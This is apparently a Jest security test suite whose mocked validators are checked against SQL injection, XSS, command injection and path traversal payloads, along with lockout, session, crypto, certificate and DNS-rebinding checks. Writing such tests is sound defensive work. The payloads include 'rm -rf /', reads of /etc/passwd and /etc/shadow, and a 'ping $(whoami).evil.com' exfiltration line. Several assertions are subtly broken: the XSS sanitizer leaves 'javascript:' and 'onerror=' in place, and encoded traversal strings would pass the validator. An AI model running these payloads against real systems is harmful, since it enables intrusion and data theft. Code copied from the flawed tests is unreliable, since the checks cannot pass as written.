/**
 * Security Vulnerability Assessment Tests
 * Comprehensive security scanning and penetration testing
 */

const crypto = require('crypto');

describe('Security Vulnerability Assessment', () => {
  let securityAudit;

  beforeAll(() => {
    securityAudit = global.securityAudit;
  });

  describe('Input Validation Vulnerabilities', () => {
    test('should prevent SQL injection attacks', () => {
      // Mock database query function
      const executeQuery = (query, params = []) => {
        // Simulate parameterized queries (secure)
        if (params.length > 0) {
          return { success: true, data: ['mock_data'], secure: true };
        }

        // Simulate string concatenation (vulnerable)
        const suspiciousPatterns = [
          /'.*OR.*'/i,
          /;.*DROP/i,
          /UNION.*SELECT/i,
          /INSERT.*INTO/i,
          /'.*1=1/i
        ];

        const hasInjection = suspiciousPatterns.some(pattern => pattern.test(query));

        if (hasInjection) {
          throw new Error('SQL injection detected');
        }

        return { success: true, data: ['safe_data'], secure: false };
      };

      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM passwords --",
        "admin' OR 1=1 /*",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --"
      ];

      // Test vulnerable queries (should be blocked)
      for (const payload of sqlInjectionPayloads) {
        expect(() => {
          executeQuery(`SELECT * FROM users WHERE username = '${payload}'`);
        }).toThrow('SQL injection detected');

        securityAudit.log('sql_injection_blocked', {
          payload: payload.substring(0, 20) + '...',
          blocked: true
        });
      }

      // Test secure parameterized queries (should work)
      const safeResult = executeQuery('SELECT * FROM users WHERE username = ?', ['legitimate_user']);
      expect(safeResult.success).toBe(true);
      expect(safeResult.secure).toBe(true);

      securityAudit.log('parameterized_query_test', {
        secure: true,
        injectionPrevented: true
      });
    });

    test('should prevent cross-site scripting (XSS) attacks', () => {
      // Mock HTML sanitization function
      const sanitizeInput = (input) => {
        const htmlEntities = {
          '&': '&amp;',
          '<': '&lt;',
          '>': '&gt;',
          '"': '&quot;',
          "'": '&#x27;',
          '/': '&#x2F;'
        };

        return input.replace(/[&<>"'/]/g, char => htmlEntities[char]);
      };

      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '"><script>document.cookie</script>',
        '<svg onload="alert(1)">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload="alert(\'XSS\')">',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>'
      ];

      for (const payload of xssPayloads) {
        const sanitized = sanitizeInput(payload);

        // Verify malicious scripts are neutralized
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('onload=');

        securityAudit.log('xss_sanitization', {
          originalLength: payload.length,
          sanitizedLength: sanitized.length,
          containsScript: sanitized.includes('&lt;script&gt;'),
          neutralized: true
        });
      }

      // Test that normal content is preserved
      const normalInput = 'Hello, this is normal content with "quotes" and <em>formatting</em>';
      const sanitizedNormal = sanitizeInput(normalInput);

      expect(sanitizedNormal).toContain('Hello, this is normal content');
      expect(sanitizedNormal).toContain('&quot;quotes&quot;');
      expect(sanitizedNormal).toContain('&lt;em&gt;formatting&lt;&#x2F;em&gt;');

      securityAudit.log('xss_prevention_summary', {
        payloadsTested: xssPayloads.length,
        allBlocked: true,
        normalContentPreserved: true
      });
    });

    test('should prevent command injection attacks', () => {
      // Mock system command execution function
      const executeCommand = (command, args = []) => {
        const dangerousPatterns = [
          /[;&|`$()]/,  // Shell metacharacters
          /\.\./,       // Directory traversal
          /rm\s+-rf/i,  // Dangerous commands
          /sudo/i,
          /passwd/i,
          /cat\s+\/etc/i
        ];

        // Check command for dangerous patterns
        const fullCommand = `${command} ${args.join(' ')}`;
        const isDangerous = dangerousPatterns.some(pattern => pattern.test(fullCommand));

        if (isDangerous) {
          throw new Error('Command injection detected');
        }

        // Simulate safe command execution
        return { output: 'safe command executed', exitCode: 0 };
      };

      const commandInjectionPayloads = [
        'ls; cat /etc/passwd',
        'ping 127.0.0.1 && cat /etc/shadow',
        'echo test | rm -rf /',
        'ls `cat /etc/hosts`',
        'ping $(whoami).evil.com',
        'ls ../../../etc/passwd',
        'sudo -l'
      ];

      for (const payload of commandInjectionPayloads) {
        expect(() => {
          executeCommand(payload);
        }).toThrow('Command injection detected');

        securityAudit.log('command_injection_blocked', {
          payload: payload.substring(0, 30) + '...',
          blocked: true
        });
      }

      // Test safe command execution
      const safeResult = executeCommand('ls', ['-la', '/home/user/documents']);
      expect(safeResult.output).toBe('safe command executed');
      expect(safeResult.exitCode).toBe(0);

      securityAudit.log('command_injection_prevention', {
        dangerousPayloadsBlocked: commandInjectionPayloads.length,
        safeCommandsAllowed: true
      });
    });

    test('should prevent path traversal attacks', () => {
      const validateFilePath = (filePath, allowedDirectory) => {
        const path = require('path');

        // Normalize the path to resolve .. and . segments
        const normalizedPath = path.normalize(filePath);

        // Check for null bytes (can bypass some filters)
        if (normalizedPath.includes('\0')) {
          throw new Error('Null byte detected in file path');
        }

        // Check for directory traversal attempts
        if (normalizedPath.includes('..')) {
          throw new Error('Directory traversal detected');
        }

        // Ensure path is within allowed directory
        const resolvedPath = path.resolve(allowedDirectory, normalizedPath);
        const resolvedAllowedDir = path.resolve(allowedDirectory);

        if (!resolvedPath.startsWith(resolvedAllowedDir)) {
          throw new Error('Path outside allowed directory');
        }

        return resolvedPath;
      };

      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//etc/shadow',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',  // URL encoded
        '/var/www/../../../etc/passwd',
        'file.txt\0../../etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',      // Double URL encoded
        '..%c0%af..%c0%afetc%c0%afpasswd'          // UTF-8 encoded
      ];

      const allowedDirectory = '/home/user/uploads';

      for (const payload of pathTraversalPayloads) {
        expect(() => {
          validateFilePath(payload, allowedDirectory);
        }).toThrow();

        securityAudit.log('path_traversal_blocked', {
          payload: payload.substring(0, 30) + '...',
          blocked: true
        });
      }

      // Test legitimate file access
      const legitimatePath = validateFilePath('document.txt', allowedDirectory);
      expect(legitimatePath).toContain(allowedDirectory);
      expect(legitimatePath).toContain('document.txt');

      securityAudit.log('path_traversal_prevention', {
        attacksBlocked: pathTraversalPayloads.length,
        legitimateAccessAllowed: true
      });
    });
  });

  describe('Authentication & Session Vulnerabilities', () => {
    test('should prevent brute force attacks', async () => {
      // Mock rate-limited authentication system
      class AuthenticationSystem {
        constructor() {
          this.attempts = new Map();
          this.maxAttempts = 5;
          this.windowMs = 300000; // 5 minutes
          this.lockoutDuration = 600000; // 10 minutes
        }

        async authenticate(username, password) {
          const now = Date.now();
          const userAttempts = this.attempts.get(username) || { count: 0, firstAttempt: now, lockedUntil: 0 };

          // Check if user is locked out
          if (userAttempts.lockedUntil > now) {
            throw new Error(`Account locked. Try again in ${Math.ceil((userAttempts.lockedUntil - now) / 1000)} seconds`);
          }

          // Reset attempts if window has expired
          if (now - userAttempts.firstAttempt > this.windowMs) {
            userAttempts.count = 0;
            userAttempts.firstAttempt = now;
          }

          // Simulate password check (with constant time comparison)
          const validPassword = 'correct_password';
          const isValid = await this.constantTimeCompare(password, validPassword);

          if (!isValid) {
            userAttempts.count++;
            userAttempts.lastAttempt = now;

            // Lock account if max attempts exceeded
            if (userAttempts.count >= this.maxAttempts) {
              userAttempts.lockedUntil = now + this.lockoutDuration;
              this.attempts.set(username, userAttempts);
              throw new Error('Account locked due to too many failed attempts');
            }

            this.attempts.set(username, userAttempts);
            throw new Error('Invalid credentials');
          }

          // Success - clear attempts
          this.attempts.delete(username);
          return { success: true, token: 'auth_token_' + crypto.randomUUID() };
        }

        async constantTimeCompare(provided, expected) {
          // Simulate constant time comparison to prevent timing attacks
          await new Promise(resolve => setTimeout(resolve, 100 + Math.random() * 50));

          if (provided.length !== expected.length) {
            return false;
          }

          let result = 0;
          for (let i = 0; i < provided.length; i++) {
            result |= provided.charCodeAt(i) ^ expected.charCodeAt(i);
          }

          return result === 0;
        }
      }

      const auth = new AuthenticationSystem();
      const testUsername = 'testuser';

      // Simulate brute force attack
      let lockedOut = false;
      let attemptCount = 0;

      for (let i = 0; i < 10; i++) {
        try {
          await auth.authenticate(testUsername, `wrong_password_${i}`);
        } catch (error) {
          attemptCount++;
          if (error.message.includes('locked')) {
            lockedOut = true;
            break;
          }
        }
      }

      expect(lockedOut).toBe(true);
      expect(attemptCount).toBeLessThanOrEqual(auth.maxAttempts);

      securityAudit.log('brute_force_protection', {
        attemptsBeforeLockout: attemptCount,
        lockoutTriggered: lockedOut,
        maxAttemptsConfigured: auth.maxAttempts
      });

      // Test legitimate access after lockout
      try {
        await auth.authenticate(testUsername, 'correct_password');
        expect(true).toBe(false); // Should not reach here while locked
      } catch (error) {
        expect(error.message).toContain('locked');
        securityAudit.log('lockout_enforced', { legitimateAccessBlocked: true });
      }
    });

    test('should prevent session hijacking', () => {
      // Mock secure session management
      class SecureSessionManager {
        constructor() {
          this.sessions = new Map();
          this.sessionTimeout = 3600000; // 1 hour
        }

        createSession(userId, clientFingerprint) {
          const sessionId = this.generateSecureSessionId();
          const session = {
            id: sessionId,
            userId,
            createdAt: Date.now(),
            lastActivity: Date.now(),
            expiresAt: Date.now() + this.sessionTimeout,
            clientFingerprint,
            ipAddress: clientFingerprint.ip,
            userAgent: clientFingerprint.userAgent,
            valid: true
          };

          this.sessions.set(sessionId, session);
          return sessionId;
        }

        validateSession(sessionId, currentFingerprint) {
          const session = this.sessions.get(sessionId);

          if (!session) {
            throw new Error('Session not found');
          }

          if (!session.valid) {
            throw new Error('Session invalidated');
          }

          if (Date.now() > session.expiresAt) {
            this.invalidateSession(sessionId);
            throw new Error('Session expired');
          }

          // Check for session hijacking indicators
          if (session.ipAddress !== currentFingerprint.ip) {
            this.invalidateSession(sessionId);
            securityAudit.log('session_hijacking_detected', {
              originalIp: session.ipAddress,
              currentIp: currentFingerprint.ip,
              sessionInvalidated: true
            });
            throw new Error('Session security violation: IP address mismatch');
          }

          if (session.userAgent !== currentFingerprint.userAgent) {
            this.invalidateSession(sessionId);
            securityAudit.log('session_hijacking_detected', {
              originalUserAgent: session.userAgent.substring(0, 50),
              currentUserAgent: currentFingerprint.userAgent.substring(0, 50),
              sessionInvalidated: true
            });
            throw new Error('Session security violation: User agent mismatch');
          }

          // Update last activity
          session.lastActivity = Date.now();
          return session;
        }

        generateSecureSessionId() {
          return crypto.randomBytes(32).toString('base64url');
        }

        invalidateSession(sessionId) {
          const session = this.sessions.get(sessionId);
          if (session) {
            session.valid = false;
            session.invalidatedAt = Date.now();
          }
        }
      }

      const sessionManager = new SecureSessionManager();

      const originalFingerprint = {
        ip: '192.168.1.100',
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      };

      // Create legitimate session
      const sessionId = sessionManager.createSession('user123', originalFingerprint);
      expect(sessionId).toBeDefined();

      // Validate with correct fingerprint
      const validSession = sessionManager.validateSession(sessionId, originalFingerprint);
      expect(validSession.userId).toBe('user123');

      // Test IP address change (potential hijacking)
      const hijackedFingerprint1 = {
        ...originalFingerprint,
        ip: '10.0.0.5' // Different IP
      };

      expect(() => {
        sessionManager.validateSession(sessionId, hijackedFingerprint1);
      }).toThrow('IP address mismatch');

      // Create new session for user agent test
      const sessionId2 = sessionManager.createSession('user456', originalFingerprint);

      // Test User Agent change (potential hijacking)
      const hijackedFingerprint2 = {
        ...originalFingerprint,
        userAgent: 'curl/7.68.0' // Different user agent
      };

      expect(() => {
        sessionManager.validateSession(sessionId2, hijackedFingerprint2);
      }).toThrow('User agent mismatch');

      securityAudit.log('session_hijacking_prevention', {
        legitimateSessionCreated: true,
        ipChangeDetected: true,
        userAgentChangeDetected: true,
        sessionsInvalidated: 2
      });
    });

    test('should prevent privilege escalation', () => {
      // Mock role-based access control system
      class AccessControlSystem {
        constructor() {
          this.userRoles = new Map();
          this.rolePermissions = new Map([
            ['guest', ['read_public']],
            ['user', ['read_public', 'read_personal', 'write_personal']],
            ['moderator', ['read_public', 'read_personal', 'write_personal', 'moderate_content']],
            ['admin', ['read_public', 'read_personal', 'write_personal', 'moderate_content', 'admin_functions']]
          ]);
        }

        assignRole(userId, role) {
          if (!this.rolePermissions.has(role)) {
            throw new Error('Invalid role');
          }
          this.userRoles.set(userId, role);
        }

        checkPermission(userId, requiredPermission) {
          const userRole = this.userRoles.get(userId);
          if (!userRole) {
            return false;
          }

          const permissions = this.rolePermissions.get(userRole);
          return permissions.includes(requiredPermission);
        }

        attemptPrivilegeEscalation(userId, targetRole, exploitMethod) {
          securityAudit.log('privilege_escalation_attempt', {
            userId,
            currentRole: this.userRoles.get(userId),
            targetRole,
            exploitMethod
          });

          // All escalation attempts should fail
          throw new Error('Privilege escalation attempt blocked');
        }

        secureRoleAssignment(adminUserId, targetUserId, newRole) {
          // Verify admin has permission to assign roles
          if (!this.checkPermission(adminUserId, 'admin_functions')) {
            throw new Error('Insufficient privileges to assign roles');
          }

          this.assignRole(targetUserId, newRole);

          securityAudit.log('role_assignment', {
            adminUser: adminUserId,
            targetUser: targetUserId,
            newRole,
            authorized: true
          });
        }
      }

      const accessControl = new AccessControlSystem();

      // Set up test users
      accessControl.assignRole('user1', 'user');
      accessControl.assignRole('admin1', 'admin');

      // Test normal access control
      expect(accessControl.checkPermission('user1', 'read_personal')).toBe(true);
      expect(accessControl.checkPermission('user1', 'admin_functions')).toBe(false);

      // Test privilege escalation attempts
      const escalationMethods = [
        'parameter_manipulation',
        'session_token_modification',
        'role_injection',
        'bypass_authorization_check'
      ];

      for (const method of escalationMethods) {
        expect(() => {
          accessControl.attemptPrivilegeEscalation('user1', 'admin', method);
        }).toThrow('Privilege escalation attempt blocked');
      }

      // Test unauthorized role assignment
      expect(() => {
        accessControl.secureRoleAssignment('user1', 'user2', 'admin');
      }).toThrow('Insufficient privileges');

      // Test authorized role assignment
      accessControl.secureRoleAssignment('admin1', 'user2', 'moderator');
      expect(accessControl.checkPermission('user2', 'moderate_content')).toBe(true);

      securityAudit.log('privilege_escalation_prevention', {
        escalationAttemptsBlocked: escalationMethods.length,
        unauthorizedRoleAssignmentBlocked: true,
        authorizedRoleAssignmentAllowed: true
      });
    });
  });

  describe('Cryptographic Vulnerabilities', () => {
    test('should prevent weak random number generation', () => {
      // Test crypto-secure randomness
      const testRandomQuality = (generator, label) => {
        const samples = [];
        const sampleSize = 10000;

        // Generate samples
        for (let i = 0; i < sampleSize; i++) {
          samples.push(generator());
        }

        // Statistical tests
        const mean = samples.reduce((a, b) => a + b, 0) / samples.length;
        const variance = samples.reduce((acc, val) => acc + Math.pow(val - mean, 2), 0) / samples.length;
        const uniqueValues = new Set(samples).size;

        return {
          label,
          mean: Math.round(mean * 1000) / 1000,
          variance: Math.round(variance * 1000) / 1000,
          uniqueness: uniqueValues / sampleSize,
          passesTests: uniqueValues / sampleSize > 0.95 && Math.abs(mean - 0.5) < 0.1
        };
      };

      // Test crypto-secure generator
      const cryptoResults = testRandomQuality(
        () => crypto.randomBytes(1)[0] / 255,
        'crypto.randomBytes'
      );

      // Test weak Math.random (for comparison)
      const mathResults = testRandomQuality(
        () => Math.random(),
        'Math.random'
      );

      expect(cryptoResults.passesTests).toBe(true);
      expect(cryptoResults.uniqueness).toBeGreaterThan(0.95);

      securityAudit.log('random_number_quality', {
        cryptoSecure: cryptoResults,
        mathRandom: mathResults,
        cryptoIsSecure: cryptoResults.passesTests
      });
    });

    test('should prevent weak encryption parameters', () => {
      const validateEncryptionConfig = (algorithm, keySize, ivSize) => {
        const vulnerabilities = [];

        // Check algorithm strength
        const weakAlgorithms = ['des', 'rc4', 'md5'];
        if (weakAlgorithms.some(weak => algorithm.toLowerCase().includes(weak))) {
          vulnerabilities.push('weak_algorithm');
        }

        // Check key size
        const minKeySizes = {
          'aes': 256,
          'rsa': 2048,
          'ecdsa': 256
        };

        Object.entries(minKeySizes).forEach(([alg, minSize]) => {
          if (algorithm.toLowerCase().includes(alg) && keySize < minSize) {
            vulnerabilities.push('insufficient_key_size');
          }
        });

        // Check IV/nonce size for authenticated encryption
        if (algorithm.includes('gcm') && ivSize < 96) {
          vulnerabilities.push('insufficient_iv_size');
        }

        return {
          secure: vulnerabilities.length === 0,
          vulnerabilities
        };
      };

      const encryptionConfigs = [
        { algorithm: 'aes-256-gcm', keySize: 256, ivSize: 96, shouldBeSecure: true },
        { algorithm: 'aes-128-cbc', keySize: 128, ivSize: 128, shouldBeSecure: false }, // Weak key size
        { algorithm: 'des-cbc', keySize: 56, ivSize: 64, shouldBeSecure: false }, // Weak algorithm
        { algorithm: 'rsa-2048', keySize: 2048, ivSize: 0, shouldBeSecure: true },
        { algorithm: 'rsa-1024', keySize: 1024, ivSize: 0, shouldBeSecure: false } // Weak key size
      ];

      for (const config of encryptionConfigs) {
        const validation = validateEncryptionConfig(config.algorithm, config.keySize, config.ivSize);

        if (config.shouldBeSecure) {
          expect(validation.secure).toBe(true);
        } else {
          expect(validation.secure).toBe(false);
          expect(validation.vulnerabilities.length).toBeGreaterThan(0);
        }

        securityAudit.log('encryption_config_validation', {
          algorithm: config.algorithm,
          keySize: config.keySize,
          secure: validation.secure,
          vulnerabilities: validation.vulnerabilities
        });
      }
    });

    test('should prevent timing attacks on cryptographic operations', async () => {
      // Mock timing-safe comparison
      const timingSafeCompare = (a, b) => {
        if (a.length !== b.length) {
          // Still perform computation to avoid length-based timing attacks
          let dummy = 0;
          for (let i = 0; i < Math.max(a.length, b.length); i++) {
            dummy ^= (a[i % a.length] || 0) ^ (b[i % b.length] || 0);
          }
          return false;
        }

        let result = 0;
        for (let i = 0; i < a.length; i++) {
          result |= a[i] ^ b[i];
        }

        return result === 0;
      };

      // Test timing attack resistance
      const secret = Buffer.from('super_secret_authentication_token_12345');
      const testInputs = [
        Buffer.from('wrong_token_completely_different_length'),
        Buffer.from('super_secret_authentication_token_12345'), // Correct
        Buffer.from('super_secret_authentication_token_12346'), // Wrong last char
        Buffer.from('xuper_secret_authentication_token_12345'), // Wrong first char
        Buffer.from('super_secret_authentication_token_11111')  // Wrong middle chars
      ];

      const timings = [];

      for (let iteration = 0; iteration < 5; iteration++) {
        for (const input of testInputs) {
          const start = performance.now();
          const result = timingSafeCompare(secret, input);
          const duration = performance.now() - start;

          timings.push({
            inputIndex: testInputs.indexOf(input),
            duration,
            correct: input.equals(secret),
            iteration
          });
        }
      }

      // Analyze timing variations
      const correctTimings = timings.filter(t => t.correct).map(t => t.duration);
      const incorrectTimings = timings.filter(t => !t.correct).map(t => t.duration);

      const avgCorrect = correctTimings.reduce((a, b) => a + b, 0) / correctTimings.length;
      const avgIncorrect = incorrectTimings.reduce((a, b) => a + b, 0) / incorrectTimings.length;
      const timingDifference = Math.abs(avgCorrect - avgIncorrect);

      // Timing difference should be minimal (< 0.1ms for timing attack resistance)
      expect(timingDifference).toBeLessThan(0.1);

      securityAudit.log('timing_attack_resistance', {
        avgCorrectTiming: Math.round(avgCorrect * 1000) / 1000,
        avgIncorrectTiming: Math.round(avgIncorrect * 1000) / 1000,
        timingDifference: Math.round(timingDifference * 1000) / 1000,
        timingAttackResistant: timingDifference < 0.1
      });
    });
  });

  describe('Network Security Vulnerabilities', () => {
    test('should prevent man-in-the-middle attacks', () => {
      // Mock certificate validation
      class CertificateValidator {
        constructor() {
          this.trustedCAs = new Set([
            'trusted-ca-1',
            'trusted-ca-2',
            'walrus-internal-ca'
          ]);
        }

        validateCertificate(certificate) {
          const issues = [];

          // Check certificate expiration
          const now = Date.now();
          if (certificate.notBefore > now) {
            issues.push('certificate_not_yet_valid');
          }
          if (certificate.notAfter < now) {
            issues.push('certificate_expired');
          }

          // Check certificate authority
          if (!this.trustedCAs.has(certificate.issuer)) {
            issues.push('untrusted_ca');
          }

          // Check certificate chain
          if (!certificate.chain || certificate.chain.length < 2) {
            issues.push('incomplete_certificate_chain');
          }

          // Check for self-signed certificates in production
          if (certificate.issuer === certificate.subject) {
            issues.push('self_signed_certificate');
          }

          // Check key strength
          if (certificate.keySize < 2048) {
            issues.push('weak_key_size');
          }

          return {
            valid: issues.length === 0,
            issues
          };
        }

        validateHostname(certificate, hostname) {
          // Check Subject Alternative Names (SAN)
          if (certificate.san && certificate.san.includes(hostname)) {
            return true;
          }

          // Check Common Name (CN)
          if (certificate.commonName === hostname) {
            return true;
          }

          // Check wildcard certificates
          if (certificate.commonName.startsWith('*.')) {
            const domain = certificate.commonName.substring(2);
            if (hostname.endsWith(domain) && hostname.indexOf('.') === hostname.lastIndexOf('.')) {
              return true;
            }
          }

          return false;
        }
      }

      const validator = new CertificateValidator();

      // Test certificates
      const certificates = [
        {
          label: 'valid_certificate',
          cert: {
            issuer: 'trusted-ca-1',
            subject: 'walrus.protocol.com',
            commonName: 'walrus.protocol.com',
            san: ['walrus.protocol.com', 'api.walrus.protocol.com'],
            notBefore: Date.now() - 86400000, // Yesterday
            notAfter: Date.now() + 31536000000, // One year from now
            keySize: 2048,
            chain: ['intermediate-ca', 'root-ca']
          },
          hostname: 'walrus.protocol.com',
          shouldBeValid: true
        },
        {
          label: 'expired_certificate',
          cert: {
            issuer: 'trusted-ca-1',
            subject: 'expired.example.com',
            commonName: 'expired.example.com',
            notBefore: Date.now() - 31536000000, // One year ago
            notAfter: Date.now() - 86400000, // Yesterday
            keySize: 2048,
            chain: ['intermediate-ca', 'root-ca']
          },
          hostname: 'expired.example.com',
          shouldBeValid: false
        },
        {
          label: 'untrusted_ca',
          cert: {
            issuer: 'malicious-ca',
            subject: 'fake.walrus.com',
            commonName: 'fake.walrus.com',
            notBefore: Date.now() - 86400000,
            notAfter: Date.now() + 31536000000,
            keySize: 2048,
            chain: ['fake-intermediate', 'fake-root']
          },
          hostname: 'fake.walrus.com',
          shouldBeValid: false
        },
        {
          label: 'hostname_mismatch',
          cert: {
            issuer: 'trusted-ca-1',
            subject: 'legitimate.com',
            commonName: 'legitimate.com',
            notBefore: Date.now() - 86400000,
            notAfter: Date.now() + 31536000000,
            keySize: 2048,
            chain: ['intermediate-ca', 'root-ca']
          },
          hostname: 'walrus.protocol.com', // Mismatch
          shouldBeValid: false
        }
      ];

      for (const testCase of certificates) {
        const certValidation = validator.validateCertificate(testCase.cert);
        const hostnameValidation = validator.validateHostname(testCase.cert, testCase.hostname);

        const overallValid = certValidation.valid && hostnameValidation;

        if (testCase.shouldBeValid) {
          expect(overallValid).toBe(true);
        } else {
          expect(overallValid).toBe(false);
        }

        securityAudit.log('certificate_validation', {
          label: testCase.label,
          certificateValid: certValidation.valid,
          hostnameValid: hostnameValidation,
          overallValid,
          issues: certValidation.issues
        });
      }
    });

    test('should prevent DNS spoofing and rebinding attacks', () => {
      // Mock DNS security validation
      class DNSSecurityValidator {
        constructor() {
          this.allowedDomains = new Set([
            'walrus.protocol.com',
            'api.walrus.protocol.com',
            'seal.walrus.protocol.com'
          ]);

          this.blockedIPs = new Set([
            '127.0.0.1',     // Localhost
            '0.0.0.0',       // Null route
            '10.0.0.0/8',    // Private networks
            '172.16.0.0/12',
            '192.168.0.0/16',
            '169.254.0.0/16' // Link-local
          ]);
        }

        validateDNSResponse(domain, resolvedIP) {
          const issues = [];

          // Check if domain is in allowed list
          if (!this.allowedDomains.has(domain)) {
            issues.push('domain_not_allowed');
          }

          // Check for private IP addresses (DNS rebinding)
          if (this.isPrivateIP(resolvedIP)) {
            issues.push('private_ip_resolved');
          }

          // Check for suspicious IP patterns
          if (resolvedIP === '127.0.0.1' || resolvedIP === '::1') {
            issues.push('localhost_resolution');
          }

          return {
            safe: issues.length === 0,
            issues
          };
        }

        isPrivateIP(ip) {
          // Simplified private IP check
          const privateRanges = [
            /^127\./,        // Loopback
            /^10\./,         // Class A private
            /^172\.(1[6-9]|2[0-9]|3[01])\./,  // Class B private
            /^192\.168\./,   // Class C private
            /^169\.254\./    // Link-local
          ];

          return privateRanges.some(range => range.test(ip));
        }

        preventDNSRebinding(domain, ips) {
          const validIPs = [];
          const blockedIPs = [];

          for (const ip of ips) {
            if (this.isPrivateIP(ip)) {
              blockedIPs.push(ip);
            } else {
              validIPs.push(ip);
            }
          }

          if (blockedIPs.length > 0) {
            securityAudit.log('dns_rebinding_prevented', {
              domain,
              blockedIPs,
              validIPs
            });
          }

          return validIPs;
        }
      }

      const dnsValidator = new DNSSecurityValidator();

      const dnsTestCases = [
        {
          domain: 'walrus.protocol.com',
          resolvedIP: '203.0.113.1',
          shouldBeSafe: true
        },
        {
          domain: 'evil.attacker.com',
          resolvedIP: '203.0.113.2',
          shouldBeSafe: false // Domain not allowed
        },
        {
          domain: 'walrus.protocol.com',
          resolvedIP: '127.0.0.1',
          shouldBeSafe: false // Localhost resolution
        },
        {
          domain: 'api.walrus.protocol.com',
          resolvedIP: '192.168.1.100',
          shouldBeSafe: false // Private IP
        }
      ];

      for (const testCase of dnsTestCases) {
        const validation = dnsValidator.validateDNSResponse(testCase.domain, testCase.resolvedIP);

        if (testCase.shouldBeSafe) {
          expect(validation.safe).toBe(true);
        } else {
          expect(validation.safe).toBe(false);
          expect(validation.issues.length).toBeGreaterThan(0);
        }

        securityAudit.log('dns_security_validation', {
          domain: testCase.domain,
          resolvedIP: testCase.resolvedIP,
          safe: validation.safe,
          issues: validation.issues
        });
      }

      // Test DNS rebinding prevention
      const rebindingTest = dnsValidator.preventDNSRebinding('example.com', [
        '203.0.113.1',  // Valid public IP
        '127.0.0.1',    // Blocked localhost
        '192.168.1.1',  // Blocked private
        '8.8.8.8'       // Valid public IP
      ]);

      expect(rebindingTest).toEqual(['203.0.113.1', '8.8.8.8']);

      securityAudit.log('dns_rebinding_test', {
        inputIPs: 4,
        validIPs: rebindingTest.length,
        blockedIPs: 2
      });
    });
  });

  afterAll(() => {
    // Generate comprehensive vulnerability assessment report
    const auditEntries = global.securityAudit.logs;
    const vulnerabilityCategories = {};

    auditEntries.forEach(entry => {
      const category = entry.event.split('_')[0];
      if (!vulnerabilityCategories[category]) {
        vulnerabilityCategories[category] = [];
      }
      vulnerabilityCategories[category].push(entry);
    });

    securityAudit.log('vulnerability_assessment_summary', {
      totalTests: auditEntries.length,
      categories: Object.keys(vulnerabilityCategories),
      categoryCounts: Object.fromEntries(
        Object.entries(vulnerabilityCategories).map(([cat, entries]) => [cat, entries.length])
      )
    });

    console.log('\n=== SECURITY VULNERABILITY ASSESSMENT COMPLETE ===');
    console.log(`Total security tests executed: ${auditEntries.length}`);
    console.log('Vulnerability categories tested:', Object.keys(vulnerabilityCategories).join(', '));
  });
});